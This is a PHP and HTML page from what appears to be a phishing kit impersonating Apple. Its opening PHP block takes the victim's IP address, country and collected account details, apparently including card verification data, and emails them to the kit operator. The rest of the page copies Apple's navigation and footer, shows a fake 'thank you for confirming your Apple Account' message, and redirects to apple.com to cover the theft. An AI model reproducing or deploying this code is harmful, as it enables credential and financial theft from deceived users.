<?php
session_start();
include("send/sendlogin.php");
include("send/to.php");
$ip = getenv("REMOTE_ADDR");
$subject = "Apple Account Info [ $ip | ".$_SESSION["COUNTRY"]." ]";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: Apple VbV <aziz>" . "\r\n";

mail($to, $subject, appleallinfo(),$head);
?>
<!DOCTYPE html>
<html>
<head>
	<title>success</title>
	<link rel="stylesheet" type="text/css" href="https://www.apple.com/ac/globalnav/2.0/en_US/styles/ac-globalnav.built.css">
	<link rel="stylesheet" type="text/css" href="css/app.css">
    <link rel="stylesheet" type="text/css" href="css/card.css">
    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
    <meta http-equiv="refresh" content="3;url=http://www.apple.com/" />
</head>
<body id="pagecontent">
    <div id="managedata"></div>
    <div id="content">
        <app>
            <div class="app-container">
                <applenav>

                    <aside id="ac-gn-segmentbar" class="ac-gn-segmentbar" data-strings="{ 'exit': 'Exit', 'view': '{%STOREFRONT%} Store Home', 'segments': { 'smb': 'Business Store Home', 'eduInd': 'Education Store Home', 'other': 'Store Home' } }"></aside>
                    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
                    <nav id="ac-globalnav" class="js no-touch svg no-ie7 no-ie8" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US" data-store-key="" data-store-locale="us" data-store-api="//www.apple.com/[storefront]/shop/bag/status" data-search-locale="en_US" data-search-api="//www.apple.com/search-services/suggestions/">
                        <div class="ac-gn-content">
                            <ul class="ac-gn-header">
                                <li class="ac-gn-item ac-gn-menuicon">
                                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
                                        <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                                        </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                                            <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                                        </span>
                                    </label>
                                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
                                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-apple">
                                    <a class="ac-gn-link ac-gn-link-apple" href="//www.apple.com/" data-analytics-title="apple home" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">Apple</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                                    <a class="ac-gn-link ac-gn-link-bag" href="#" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                                </li>
                            </ul>
                            <ul class="ac-gn-list">
                                <li class="ac-gn-item ac-gn-apple">
                                    <a class="ac-gn-link ac-gn-link-apple" href="#" data-analytics-title="apple home" id="ac-gn-firstfocus"> <span class="ac-gn-link-text">Apple</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
                                    <a class="ac-gn-link ac-gn-link-mac" href="" " data-analytics-title=" mac"> <span class="ac-gn-link-text">Mac</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
                                    <a class="ac-gn-link ac-gn-link-ipad" href="#" data-analytics-title="ipad"> <span class="ac-gn-link-text">iPad</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
                                    <a class="ac-gn-link ac-gn-link-iphone" href="#" data-analytics-title="iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
                                    <a class="ac-gn-link ac-gn-link-watch" href="#" data-analytics-title="watch"> <span class="ac-gn-link-text">Watch</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
                                    <a class="ac-gn-link ac-gn-link-tv" href="#" data-analytics-title="tv"> <span class="ac-gn-link-text">TV</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
                                    <a class="ac-gn-link ac-gn-link-music" href="#" data-analytics-title="music"> <span class="ac-gn-link-text">Music</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
                                    <a class="ac-gn-link ac-gn-link-support" href="#" data-analytics-title="support"> <span class="ac-gn-link-text">Support</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
                                    <a class="ac-gn-link ac-gn-link-search" href="#" data-analytics-title="search" data-analytics-click="search" aria-label="Search apple.com" role="button" aria-haspopup="true"> <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com</span> </a>
                                </li>
                                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                                    <a class="ac-gn-link ac-gn-link-bag" href="#" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge" aria-hidden="true"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                                </li>
                            </ul>
                            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
                                <div class="ac-gn-searchview-content">
                                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="#" method="get">
                                        <div class="ac-gn-searchform-wrapper">
                                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" data-placeholder-long="Search for Products, Stores, and Help" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
                                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
                                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
                                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
                                        </div>
                                    </form>
                                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults="Hit enter to search."></aside>
                                </div>
                                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
                                    <span class="ac-gn-searchview-close-wrapper">
                                        <span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span>
                                    </span>
                                </button>
                            </aside>
                            <aside class="ac-gn-bagview" data-analytics-region="bag">
                                <div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
                                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content"> </div>
                            </aside>
                        </div>
                    </nav>
                    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
                    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
                </applenav>
                <subnav page="{page}">
                    <div class="subnav">
                        <div class="container">
                            <div class="title pull-left">Apple&nbsp;ID</div>
                            <div class="menu-wrapper pull-right">
                                <ul class="menu">
                                    <li class="item">
                                        <!--<a href="/" class="btn btn-link btn-signin" title="Sign In">Sign In</a>-->
                                        <b class="btn btn-link btn-signin"><?php echo $_SESSION['Eamil'];  ?></b>
                                    <!--</li>
                                    <li class="item  active">
                                        <a href="/account" class="btn btn-link btn-create" title="Create Your Apple ID">Create Your Apple&nbsp;ID</a>
                                    </li>
                                    <li class="item">
                                        <a href="/faq" class="btn btn-link btn-faq" title="Frequently Asked Questions">FAQ</a>
                                    </li>-->
                                </ul>
                            </div>
                        </div>
                    </div>
                </subnav>
                <hero page="{page}">
                    <div class="hero">
                        <div class="container">
                            <h1 style="font-size:30px;">&Tau;hank you for confirming your &Alpha;pple &Alpha;ccount</h1>
                        </div>
                    </div>
                </hero>
                <div id="flow">
                    <create page="{page}">
                        <div class="flow-body create-body clearfix" role="main">
                            <center>
                            	<img src="img/done.png">
                            	<p><h>Thank you for taking the steps to restore your account access. Your patience and efforts increase security for our entire community of users. 

  Apple takes the safety of your account, business and financial data as seriously as you do, and these ongoing checks of our system contribute to our high level of security.</h></p>
                            </center>
                        </div>
                    </create>
                </div>
            </div>
            <footer>



                <div class="container">
                    <div class="footer">
                        <div class="footer-wrap">
                            <div class="line1">
                                <div class="line-level">Shop the <a href="#" title="Apple Online Store">Apple Online Store</a> (<span class="skype_c2c_print_container notranslate">1-800-MY-APPLE</span><span id="skype_c2c_container" class="skype_c2c_container notranslate" dir="ltr" tabindex="-1" onmouseover="SkypeClick2Call.MenuInjectionHandler.showMenu(this, event)" onmouseout="SkypeClick2Call.MenuInjectionHandler.hideMenu(this, event)" onclick="SkypeClick2Call.MenuInjectionHandler.makeCall(this, event)" data-numbertocall="+18006927753" data-numbertype="tollfree" data-isfreecall="true" data-isrtl="false" data-ismobile="false"><span class="skype_c2c_highlighting_inactive_common" dir="ltr" skypeaction="skype_dropdown"><span class="skype_c2c_textarea_span" id="free_num_ui"><img width="0" height="0" class="skype_c2c_logo_img" src="chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/call_skype_logo.png"><span class="skype_c2c_text_span">1-800-MY-APPLE</span><span class="skype_c2c_free_text_span"> FREE</span></span></span></span>), visit an <a href="http://www.apple.com/retail/" title="Apple Retail Store">Apple Retail Store</a>, or find a <a href="http://www.apple.com/buy/" title="Reseller">reseller</a>.</div>
                            </div>
                            <div class="line2">
                                <ul class="menu">
                                    <li class="item"><a href="#" title="Apple Info">Apple Info</a></li>
                                    <li class="item"><a href="#" title="Site Map">Site Map</a></li>
                                    <li class="item"><a href="#" title="Hot News">Hot News</a></li>
                                    <li class="item"><a href="#" title="RSS Feeds">RSS Feeds</a></li>
                                    <li class="item"><a href="#" title="Contact Us">Contact Us</a></li>
                                    <li class="item">
                                        <a class="choose" title="Choose your country or region" href="/choose-your-country">
                                            <img src="https://appleid.cdn-apple.com/static/bin/cb4152743870/images/countryFooterFlags/22x22/USAflag.png" height="22" alt="United States" width="22">
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <div class="line3">
                                Copyright &copy; 2016 Apple Inc. All rights reserved.
                                <ul class="menu">
                                    <li class="item"><a href="#" title="Terms of Use">Terms of Use</a></li>
                                    <li class="item"><a href="#" title="Privacy Policy">Privacy Policy</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </app>
    </div>
</body>
</html>